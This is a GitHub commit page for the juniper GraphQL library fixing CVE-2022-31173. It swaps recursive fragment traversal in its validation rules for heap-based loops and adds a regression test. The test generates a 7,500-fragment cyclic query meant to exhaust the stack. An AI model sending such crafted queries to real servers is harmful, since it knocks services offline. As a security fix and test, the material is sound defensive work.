|  |  | juniper = { path = "../../juniper" } |
|  |  | juniper\_subscriptions = { path = "../../juniper\_subscriptions" } |
|  |  |  |
| Expand Down | |  |

56 changes: 56 additions & 0 deletions

56
[integration\_tests/juniper\_tests/src/cve\_2022\_31173.rs](#diff-41969224e494071be224af3a0e5943271fc0f879b04560e8f78ac46ad9585af0 "integration_tests/juniper_tests/src/cve_2022_31173.rs")

Show comments

[View file](/graphql-rust/juniper/blob/8d28cdba6eb10f53490ba41d1b5cb40506c2de22/integration_tests/juniper_tests/src/cve_2022_31173.rs)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -0,0 +1,56 @@ |
|  |  | //! Checks that long looping chain of fragments doesn't cause a stack overflow. |
|  |  | //! |
|  |  | //! ```graphql |
|  |  | //! # Fragment loop example |
|  |  | //! query { |
|  |  | //! ...a |
|  |  | //! } |
|  |  | //! |
|  |  | //! fragment a on Query { |
|  |  | //! ...b |
|  |  | //! } |
|  |  | //! |
|  |  | //! fragment b on Query { |
|  |  | //! ...a |
|  |  | //! } |
|  |  | //! ``` |
|  |  |  |
|  |  | use std::iter; |
|  |  |  |
|  |  | use itertools::Itertools as \_; |
|  |  | use juniper::{graphql\_object, EmptyMutation, EmptySubscription, Variables}; |
|  |  |  |
|  |  | struct Query; |
|  |  |  |
|  |  | #[graphql\_object] |
|  |  | impl Query { |
|  |  | fn dummy() -> bool { |
|  |  | false |
|  |  | } |
|  |  | } |
|  |  |  |
|  |  | type Schema = juniper::RootNode<'static, Query, EmptyMutation, EmptySubscription>; |
|  |  |  |
|  |  | #[tokio::test] |
|  |  | async fn test() { |
|  |  | const PERM: &str = "abcefghijk"; |
|  |  | const CIRCLE\_SIZE: usize = 7500; |
|  |  |  |
|  |  | let query = iter::once(format!("query {{ ...{PERM} }} ")) |
|  |  | .chain( |
|  |  | PERM.chars() |
|  |  | .permutations(PERM.len()) |
|  |  | .map(|vec| vec.into\_iter().collect::<String>()) |
|  |  | .take(CIRCLE\_SIZE) |
|  |  | .collect::<Vec<\_>>() |
|  |  | .into\_iter() |
|  |  | .circular\_tuple\_windows::<(\_, \_)>() |
|  |  | .map(|(cur, next)| format!("fragment {cur} on Query {{ ...{next} }} ")), |
|  |  | ) |
|  |  | .collect::<String>(); |
|  |  |  |
|  |  | let schema = Schema::new(Query, EmptyMutation::new(), EmptySubscription::new()); |
|  |  | let \_ = juniper::execute(&query, None, &schema, &Variables::new(), &()) |
|  |  | .await |
|  |  | .unwrap\_err(); |
|  |  | } |

2 changes: 2 additions & 0 deletions

2
[integration\_tests/juniper\_tests/src/lib.rs](#diff-4ad41a02d7b1d170160f0252aa32d34b6f1dbab12fa6e6efcdcb3d0775bb04ca "integration_tests/juniper_tests/src/lib.rs")

Show comments

[View file](/graphql-rust/juniper/blob/8d28cdba6eb10f53490ba41d1b5cb40506c2de22/integration_tests/juniper_tests/src/lib.rs)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -7,6 +7,8 @@ mod codegen; |
|  |  | #[cfg(test)] |
|  |  | mod custom\_scalar; |
|  |  | #[cfg(test)] |
|  |  | mod cve\_2022\_31173; |
|  |  | #[cfg(test)] |
|  |  | mod explicit\_null; |
|  |  | #[cfg(test)] |
|  |  | mod infallible\_as\_field\_error; |
| Expand Down | |  |

1 change: 1 addition & 0 deletions

1
[juniper/CHANGELOG.md](#diff-6e591d4f55450a1579720827f9844ed8d6b05516a388f1f1bde78a4f5d6aeb7a "juniper/CHANGELOG.md")

Show comments

[View file](/graphql-rust/juniper/blob/8d28cdba6eb10f53490ba41d1b5cb40506c2de22/juniper/CHANGELOG.md)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |

|  |  | @@ -1,5 +1,6 @@ |
|  |  | # master |
|  |  |  |
|  |  | - Fix [CVE-2022-31173](https://github.com/graphql-rust/juniper/security/advisories/GHSA-4rx6-g5vg-5f3j). |
|  |  | - Fix incorrect error when explicit `null` provided for `null`able list input parameter. ([#1086](https://github.com/graphql-rust/juniper/pull/1086)) |
|  |  |  |
|  |  | # [[0.15.9] 2022-02-02](https://github.com/graphql-rust/juniper/releases/tag/juniper-v0.15.9) |
| Expand Down | |  |

68 changes: 43 additions & 25 deletions

68
[juniper/src/validation/rules/no\_fragment\_cycles.rs](#diff-ef817e12ae1ad013bfe9fda33c4348f962ea89f05632000d9054366bd28b5836 "juniper/src/validation/rules/no_fragment_cycles.rs")

Show comments

[View file](/graphql-rust/juniper/blob/8d28cdba6eb10f53490ba41d1b5cb40506c2de22/juniper/src/validation/rules/no_fragment_cycles.rs)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -7,19 +7,6 @@ use crate::{ |
|  |  | value::ScalarValue, |
|  |  | }; |
|  |  |  |
|  |  | pub struct NoFragmentCycles<'a> { |
|  |  | current\_fragment: Option<&'a str>, |
|  |  | spreads: HashMap<&'a str, Vec<Spanning<&'a str>>>, |
|  |  | fragment\_order: Vec<&'a str>, |
|  |  | } |
|  |  |  |
|  |  | struct CycleDetector<'a> { |
|  |  | visited: HashSet<&'a str>, |
|  |  | spreads: &'a HashMap<&'a str, Vec<Spanning<&'a str>>>, |
|  |  | path\_indices: HashMap<&'a str, usize>, |
|  |  | errors: Vec<RuleError>, |
|  |  | } |
|  |  |  |
|  |  | pub fn factory<'a>() -> NoFragmentCycles<'a> { |
|  |  | NoFragmentCycles { |
|  |  | current\_fragment: None, |
| Expand All | | @@ -28,6 +15,12 @@ pub fn factory<'a>() -> NoFragmentCycles<'a> { |
|  |  | } |
|  |  | } |
|  |  |  |
|  |  | pub struct NoFragmentCycles<'a> { |
|  |  | current\_fragment: Option<&'a str>, |
|  |  | spreads: HashMap<&'a str, Vec<Spanning<&'a str>>>, |
|  |  | fragment\_order: Vec<&'a str>, |
|  |  | } |
|  |  |  |
|  |  | impl<'a, S> Visitor<'a, S> for NoFragmentCycles<'a> |
|  |  | where |
|  |  | S: ScalarValue, |
| Expand All | | @@ -38,14 +31,12 @@ where |
|  |  | let mut detector = CycleDetector { |
|  |  | visited: HashSet::new(), |
|  |  | spreads: &self.spreads, |
|  |  | path\_indices: HashMap::new(), |
|  |  | errors: Vec::new(), |
|  |  | }; |
|  |  |  |
|  |  | for frag in &self.fragment\_order { |
|  |  | if !detector.visited.contains(frag) { |
|  |  | let mut path = Vec::new(); |
|  |  | detector.detect\_from(frag, &mut path); |
|  |  | detector.detect\_from(frag); |
|  |  | } |
|  |  | } |
|  |  |  |
| Expand Down  Expand Up | | @@ -91,19 +82,46 @@ where |
|  |  | } |
|  |  | } |
|  |  |  |
|  |  | type CycleDetectorState<'a> = (&'a str, Vec<&'a Spanning<&'a str>>, HashMap<&'a str, usize>); |
|  |  |  |
|  |  | struct CycleDetector<'a> { |
|  |  | visited: HashSet<&'a str>, |
|  |  | spreads: &'a HashMap<&'a str, Vec<Spanning<&'a str>>>, |
|  |  | errors: Vec<RuleError>, |
|  |  | } |
|  |  |  |
|  |  | impl<'a> CycleDetector<'a> { |
|  |  | fn detect\_from(&mut self, from: &'a str, path: &mut Vec<&'a Spanning<&'a str>>) { |
|  |  | fn detect\_from(&mut self, from: &'a str) { |
|  |  | let mut to\_visit = Vec::new(); |
|  |  | to\_visit.push((from, Vec::new(), HashMap::new())); |
|  |  |  |
|  |  | while let Some((from, path, path\_indices)) = to\_visit.pop() { |
|  |  | to\_visit.extend(self.detect\_from\_inner(from, path, path\_indices)); |
|  |  | } |
|  |  | } |
|  |  |  |
|  |  | /// This function should be called only inside [`Self::detect\_from()`], as |
|  |  | /// it's a recursive function using heap instead of a stack. So, instead of |
|  |  | /// the recursive call, we return a [`Vec`] that is visited inside |
|  |  | /// [`Self::detect\_from()`]. |
|  |  | fn detect\_from\_inner( |
|  |  | &mut self, |
|  |  | from: &'a str, |
|  |  | path: Vec<&'a Spanning<&'a str>>, |
|  |  | mut path\_indices: HashMap<&'a str, usize>, |
|  |  | ) -> Vec<CycleDetectorState<'a>> { |
|  |  | self.visited.insert(from); |
|  |  |  |
|  |  | if !self.spreads.contains\_key(from) { |
|  |  | return; |
|  |  | return Vec::new(); |
|  |  | } |
|  |  |  |
|  |  | self.path\_indices.insert(from, path.len()); |
|  |  | path\_indices.insert(from, path.len()); |
|  |  |  |
|  |  | let mut to\_visit = Vec::new(); |
|  |  | for node in &self.spreads[from] { |
|  |  | let name = &node.item; |
|  |  | let index = self.path\_indices.get(name).cloned(); |
|  |  | let name = node.item; |
|  |  | let index = path\_indices.get(name).cloned(); |
|  |  |  |
|  |  | if let Some(index) = index { |
|  |  | let err\_pos = if index < path.len() { |
| Expand All | | @@ -114,14 +132,14 @@ impl<'a> CycleDetector<'a> { |
|  |  |  |
|  |  | self.errors |
|  |  | .push(RuleError::new(&error\_message(name), &[err\_pos.start])); |
|  |  | } else if !self.visited.contains(name) { |
|  |  | } else { |
|  |  | let mut path = path.clone(); |
|  |  | path.push(node); |
|  |  | self.detect\_from(name, path); |
|  |  | path.pop(); |
|  |  | to\_visit.push((name, path, path\_indices.clone())); |
|  |  | } |
|  |  | } |
|  |  |  |
|  |  | self.path\_indices.remove(from); |
|  |  | to\_visit |
|  |  | } |
|  |  | } |
|  |  |  |
| Expand Down | |  |

48 changes: 35 additions & 13 deletions

48
[juniper/src/validation/rules/no\_undefined\_variables.rs](#diff-e24aa0fa8ab9f5b91ad784c50242ff9331d76f6fff074f7df4ae5304b9fbe40a "juniper/src/validation/rules/no_undefined_variables.rs")

Show comments

[View file](/graphql-rust/juniper/blob/8d28cdba6eb10f53490ba41d1b5cb40506c2de22/juniper/src/validation/rules/no_undefined_variables.rs)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -12,13 +12,6 @@ pub enum Scope<'a> { |
|  |  | Fragment(&'a str), |
|  |  | } |
|  |  |  |
|  |  | pub struct NoUndefinedVariables<'a> { |
|  |  | defined\_variables: HashMap<Option<&'a str>, (SourcePosition, HashSet<&'a str>)>, |
|  |  | used\_variables: HashMap<Scope<'a>, Vec<Spanning<&'a str>>>, |
|  |  | current\_scope: Option<Scope<'a>>, |
|  |  | spreads: HashMap<Scope<'a>, Vec<&'a str>>, |
|  |  | } |
|  |  |  |
|  |  | pub fn factory<'a>() -> NoUndefinedVariables<'a> { |
|  |  | NoUndefinedVariables { |
|  |  | defined\_variables: HashMap::new(), |
| Expand All | | @@ -28,6 +21,13 @@ pub fn factory<'a>() -> NoUndefinedVariables<'a> { |
|  |  | } |
|  |  | } |
|  |  |  |
|  |  | pub struct NoUndefinedVariables<'a> { |
|  |  | defined\_variables: HashMap<Option<&'a str>, (SourcePosition, HashSet<&'a str>)>, |
|  |  | used\_variables: HashMap<Scope<'a>, Vec<Spanning<&'a str>>>, |
|  |  | current\_scope: Option<Scope<'a>>, |
|  |  | spreads: HashMap<Scope<'a>, Vec<&'a str>>, |
|  |  | } |
|  |  |  |
|  |  | impl<'a> NoUndefinedVariables<'a> { |
|  |  | fn find\_undef\_vars( |
|  |  | &'a self, |
| Expand All | | @@ -36,8 +36,34 @@ impl<'a> NoUndefinedVariables<'a> { |
|  |  | unused: &mut Vec<&'a Spanning<&'a str>>, |
|  |  | visited: &mut HashSet<Scope<'a>>, |
|  |  | ) { |
|  |  | let mut to\_visit = Vec::new(); |
|  |  | if let Some(spreads) = self.find\_undef\_vars\_inner(scope, defined, unused, visited) { |
|  |  | to\_visit.push(spreads); |
|  |  | } |
|  |  | while let Some(spreads) = to\_visit.pop() { |
|  |  | for spread in spreads { |
|  |  | if let Some(spreads) = |
|  |  | self.find\_undef\_vars\_inner(&Scope::Fragment(spread), defined, unused, visited) |
|  |  | { |
|  |  | to\_visit.push(spreads); |
|  |  | } |
|  |  | } |
|  |  | } |
|  |  | } |
|  |  |  |
|  |  | /// This function should be called only inside [`Self::find\_undef\_vars()`], |
|  |  | /// as it's a recursive function using heap instead of a stack. So, instead |
|  |  | /// of the recursive call, we return a [`Vec`] that is visited inside |
|  |  | /// [`Self::find\_undef\_vars()`]. |
|  |  | fn find\_undef\_vars\_inner( |
|  |  | &'a self, |
|  |  | scope: &Scope<'a>, |
|  |  | defined: &HashSet<&'a str>, |
|  |  | unused: &mut Vec<&'a Spanning<&'a str>>, |
|  |  | visited: &mut HashSet<Scope<'a>>, |
|  |  | ) -> Option<&'a Vec<&'a str>> { |
|  |  | if visited.contains(scope) { |
|  |  | return; |
|  |  | return None; |
|  |  | } |
|  |  |  |
|  |  | visited.insert(scope.clone()); |
| Expand All | | @@ -50,11 +76,7 @@ impl<'a> NoUndefinedVariables<'a> { |
|  |  | } |
|  |  | } |
|  |  |  |
|  |  | if let Some(spreads) = self.spreads.get(scope) { |
|  |  | for spread in spreads { |
|  |  | self.find\_undef\_vars(&Scope::Fragment(spread), defined, unused, visited); |
|  |  | } |
|  |  | } |
|  |  | self.spreads.get(scope) |
|  |  | } |
|  |  | } |
|  |  |  |
| Expand Down | |  |

49 changes: 32 additions & 17 deletions

49
[juniper/src/validation/rules/no\_unused\_fragments.rs](#diff-033339124f4e8d264c74a163f6d9e753b378964fd9fb72814c928c4bd9f14dbe "juniper/src/validation/rules/no_unused_fragments.rs")

Show comments

[View file](/graphql-rust/juniper/blob/8d28cdba6eb10f53490ba41d1b5cb40506c2de22/juniper/src/validation/rules/no_unused_fragments.rs)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -7,18 +7,12 @@ use crate::{ |
|  |  | value::ScalarValue, |
|  |  | }; |
|  |  |  |
|  |  | #[derive(Debug, Clone, PartialEq, Eq, Hash)] |
|  |  | #[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)] |
|  |  | pub enum Scope<'a> { |
|  |  | Operation(Option<&'a str>), |
|  |  | Fragment(&'a str), |
|  |  | } |
|  |  |  |
|  |  | pub struct NoUnusedFragments<'a> { |
|  |  | spreads: HashMap<Scope<'a>, Vec<&'a str>>, |
|  |  | defined\_fragments: HashSet<Spanning<&'a str>>, |
|  |  | current\_scope: Option<Scope<'a>>, |
|  |  | } |
|  |  |  |
|  |  | pub fn factory<'a>() -> NoUnusedFragments<'a> { |
|  |  | NoUnusedFragments { |
|  |  | spreads: HashMap::new(), |
| Expand All | | @@ -27,21 +21,42 @@ pub fn factory<'a>() -> NoUnusedFragments<'a> { |
|  |  | } |
|  |  | } |
|  |  |  |
|  |  | pub struct NoUnusedFragments<'a> { |
|  |  | spreads: HashMap<Scope<'a>, Vec<&'a str>>, |
|  |  | defined\_fragments: HashSet<Spanning<&'a str>>, |
|  |  | current\_scope: Option<Scope<'a>>, |
|  |  | } |
|  |  |  |
|  |  | impl<'a> NoUnusedFragments<'a> { |
|  |  | fn find\_reachable\_fragments(&self, from: &Scope<'a>, result: &mut HashSet<&'a str>) { |
|  |  | if let Scope::Fragment(name) = \*from { |
|  |  | fn find\_reachable\_fragments(&'a self, from: Scope<'a>, result: &mut HashSet<&'a str>) { |
|  |  | let mut to\_visit = Vec::new(); |
|  |  | to\_visit.push(from); |
|  |  |  |
|  |  | while let Some(from) = to\_visit.pop() { |
|  |  | if let Some(next) = self.find\_reachable\_fragments\_inner(from, result) { |
|  |  | to\_visit.extend(next.iter().map(|s| Scope::Fragment(s))); |
|  |  | } |
|  |  | } |
|  |  | } |
|  |  |  |
|  |  | /// This function should be called only inside |
|  |  | /// [`Self::find\_reachable\_fragments()`], as it's a recursive function using |
|  |  | /// heap instead of a stack. So, instead of the recursive call, we return a |
|  |  | /// [`Vec`] that is visited inside [`Self::find\_reachable\_fragments()`]. |
|  |  | fn find\_reachable\_fragments\_inner( |
|  |  | &'a self, |
|  |  | from: Scope<'a>, |
|  |  | result: &mut HashSet<&'a str>, |
|  |  | ) -> Option<&'a Vec<&'a str>> { |
|  |  | if let Scope::Fragment(name) = from { |
|  |  | if result.contains(name) { |
|  |  | return; |
|  |  | return None; |
|  |  | } else { |
|  |  | result.insert(name); |
|  |  | } |
|  |  | } |
|  |  |  |
|  |  | if let Some(spreads) = self.spreads.get(from) { |
|  |  | for spread in spreads { |
|  |  | self.find\_reachable\_fragments(&Scope::Fragment(spread), result) |
|  |  | } |
|  |  | } |
|  |  | self.spreads.get(&from) |
|  |  | } |
|  |  | } |
|  |  |  |
| Expand All | | @@ -59,7 +74,7 @@ where |
|  |  | }) = \*def |
|  |  | { |
|  |  | let op\_name = name.as\_ref().map(|s| s.item); |
|  |  | self.find\_reachable\_fragments(&Scope::Operation(op\_name), &mut reachable); |
|  |  | self.find\_reachable\_fragments(Scope::Operation(op\_name), &mut reachable); |
|  |  | } |
|  |  | } |
|  |  |  |
| Expand Down  Expand Up | | @@ -96,7 +111,7 @@ where |
|  |  | ) { |
|  |  | if let Some(ref scope) = self.current\_scope { |
|  |  | self.spreads |
|  |  | .entry(scope.clone()) |
|  |  | .entry(\*scope) |
|  |  | .or\_insert\_with(Vec::new) |
|  |  | .push(spread.item.name.item); |
|  |  | } |
| Expand Down | |  |

 Loading

Oops, something went wrong.
 Retry

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `8d28cdb`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fgraphql-rust%2Fjuniper%2Fcommit%2F8d28cdba6eb10f53490ba41d1b5cb40506c2de22) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_4a0a5705_20250108_125358.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fgraphql-rust%2Fjuniper%2Fcommit%2F2b609ee057be950e3454b69fadc431d120e407bb)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fgraphql-rust%2Fjuniper%2Fcommit%2F2b609ee057be950e3454b69fadc431d120e407bb)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=graphql-rust%2Fjuniper)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[graphql-rust](/graphql-rust)
/
**[juniper](/graphql-rust/juniper)**
Public

* [Notifications](/login?return_to=%2Fgraphql-rust%2Fjuniper) You must be signed in to change notification settings
* [Fork
  428](/login?return_to=%2Fgraphql-rust%2Fjuniper)
* [Star
   5.7k](/login?return_to=%2Fgraphql-rust%2Fjuniper)

* [Code](/graphql-rust/juniper)
* [Issues
  88](/graphql-rust/juniper/issues)
* [Pull requests
  16](/graphql-rust/juniper/pulls)
* [Discussions](/graphql-rust/juniper/discussions)
* [Actions](/graphql-rust/juniper/actions)
* [Security](/graphql-rust/juniper/security)
* [Insights](/graphql-rust/juniper/pulse)

Additional navigation options

* [Code](/graphql-rust/juniper)
* [Issues](/graphql-rust/juniper/issues)
* [Pull requests](/graphql-rust/juniper/pulls)
* [Discussions](/graphql-rust/juniper/discussions)
* [Actions](/graphql-rust/juniper/actions)
* [Security](/graphql-rust/juniper/security)
* [Insights](/graphql-rust/juniper/pulse)

## Commit

[Permalink](/graphql-rust/juniper/commit/2b609ee057be950e3454b69fadc431d120e407bb)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

Merge pull request from [GHSA-4rx6-g5vg-5f3j](https://github.com/advisories/GHSA-4rx6-g5vg-5f3j "GHSA-4rx6-g5vg-5f3j")

[Browse files](/graphql-rust/juniper/tree/2b609ee057be950e3454b69fadc431d120e407bb)
Browse the repository at this point in the history

```
* Replace recursions with heap allocations

* Some corrections [skip ci]

* Add recursive nested fragments test case

* Docs and small corrections

* Corrections

Co-authored-by: Kai Ren <tyranron@gmail.com>
```

* Loading branch information

[![@ilslv](https://avatars.githubusercontent.com/u/47687266?s=40&v=4)](/ilslv) [![@tyranron](https://avatars.githubusercontent.com/u/7114909?s=40&v=4)](/tyranron)

[ilslv](/graphql-rust/juniper/commits?author=ilslv "View all commits by ilslv")
and
[tyranron](/graphql-rust/juniper/commits?author=tyranron "View all commits by tyranron")
authored
Jul 28, 2022

1 parent
[6d6c71f](/graphql-rust/juniper/commit/6d6c71fc3b4ea28f83842b37f5154727cc641b7c)

commit 2b609ee

 Show file tree

 Hide file tree

Showing
**8 changed files**
with
**292 additions**
and
**101 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

* juniper/src/validation/rules

  + juniper/src/validation/rules/no\_fragment\_cycles.rs
    [no\_fragment\_cycles.rs](#diff-ef817e12ae1ad013bfe9fda33c4348f962ea89f05632000d9054366bd28b5836)
  + juniper/src/validation/rules/no\_undefined\_variables.rs
    [no\_undefined\_variables.rs](#diff-e24aa0fa8ab9f5b91ad784c50242ff9331d76f6fff074f7df4ae5304b9fbe40a)
  + juniper/src/validation/rules/no\_unused\_fragments.rs
    [no\_unused\_fragments.rs](#diff-033339124f4e8d264c74a163f6d9e753b378964fd9fb72814c928c4bd9f14dbe)
  + juniper/src/validation/rules/no\_unused\_variables.rs
    [no\_unused\_variables.rs](#diff-73ea1541d9b2224e1a56368379132953f9036c62abb9f75bf711d92ecdae0942)
  + juniper/src/validation/rules/overlapping\_fields\_can\_be\_merged.rs
    [overlapping\_fields\_can\_be\_merged.rs](#diff-03ebf047e5722283203e3a12691427234020240b7f3fb5b4a8f51b7b273cb127)
  + juniper/src/validation/rules/variables\_in\_allowed\_position.rs
    [variables\_in\_allowed\_position.rs](#diff-3fb84106122d28e1a824d2fd07980c3288b2085094f8beb5bf935b3ca473e3d6)
* tests/integration

  + tests/integration/Cargo.toml
    [Cargo.toml](#diff-c48c26a6da3a777be98b48671add8ae6144693d41392d1803b6fb4e40b44eaee)
  + tests

    - tests/integration/tests/cve\_2022\_31173.rs
      [cve\_2022\_31173.rs](#diff-b1ce9b857536fddfce50cc26a67d9755294a0e7eea0d644c5d4d9b07ac9facd9)

## There are no files selected for viewing

68 changes: 43 additions & 25 deletions

68
[juniper/src/validation/rules/no\_fragment\_cycles.rs](#diff-ef817e12ae1ad013bfe9fda33c4348f962ea89f05632000d9054366bd28b5836 "juniper/src/validation/rules/no_fragment_cycles.rs")

Show comments

[View file](/graphql-rust/juniper/blob/2b609ee057be950e3454b69fadc431d120e407bb/juniper/src/validation/rules/no_fragment_cycles.rs)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -7,19 +7,6 @@ use crate::{ |
|  |  | value::ScalarValue, |
|  |  | }; |
|  |  |  |
|  |  | pub struct NoFragmentCycles<'a> { |
|  |  | current\_fragment: Option<&'a str>, |
|  |  | spreads: HashMap<&'a str, Vec<Spanning<&'a str>>>, |
|  |  | fragment\_order: Vec<&'a str>, |
|  |  | } |
|  |  |  |
|  |  | struct CycleDetector<'a> { |
|  |  | visited: HashSet<&'a str>, |
|  |  | spreads: &'a HashMap<&'a str, Vec<Spanning<&'a str>>>, |
|  |  | path\_indices: HashMap<&'a str, usize>, |
|  |  | errors: Vec<RuleError>, |
|  |  | } |
|  |  |  |
|  |  | pub fn factory<'a>() -> NoFragmentCycles<'a> { |
|  |  | NoFragmentCycles { |
|  |  | current\_fragment: None, |
| Expand All | | @@ -28,6 +15,12 @@ pub fn factory<'a>() -> NoFragmentCycles<'a> { |
|  |  | } |
|  |  | } |
|  |  |  |
|  |  | pub struct NoFragmentCycles<'a> { |
|  |  | current\_fragment: Option<&'a str>, |
|  |  | spreads: HashMap<&'a str, Vec<Spanning<&'a str>>>, |
|  |  | fragment\_order: Vec<&'a str>, |
|  |  | } |
|  |  |  |
|  |  | impl<'a, S> Visitor<'a, S> for NoFragmentCycles<'a> |
|  |  | where |
|  |  | S: ScalarValue, |
| Expand All | | @@ -38,14 +31,12 @@ where |
|  |  | let mut detector = CycleDetector { |
|  |  | visited: HashSet::new(), |
|  |  | spreads: &self.spreads, |
|  |  | path\_indices: HashMap::new(), |
|  |  | errors: Vec::new(), |
|  |  | }; |
|  |  |  |
|  |  | for frag in &self.fragment\_order { |
|  |  | if !detector.visited.contains(frag) { |
|  |  | let mut path = Vec::new(); |
|  |  | detector.detect\_from(frag, &mut path); |
|  |  | detector.detect\_from(frag); |
|  |  | } |
|  |  | } |
|  |  |  |
| Expand Down  Expand Up | | @@ -91,19 +82,46 @@ where |
|  |  | } |
|  |  | } |
|  |  |  |
|  |  | type CycleDetectorState<'a> = (&'a str, Vec<&'a Spanning<&'a str>>, HashMap<&'a str, usize>); |
|  |  |  |
|  |  | struct CycleDetector<'a> { |
|  |  | visited: HashSet<&'a str>, |
|  |  | spreads: &'a HashMap<&'a str, Vec<Spanning<&'a str>>>, |
|  |  | errors: Vec<RuleError>, |
|  |  | } |
|  |  |  |
|  |  | impl<'a> CycleDetector<'a> { |
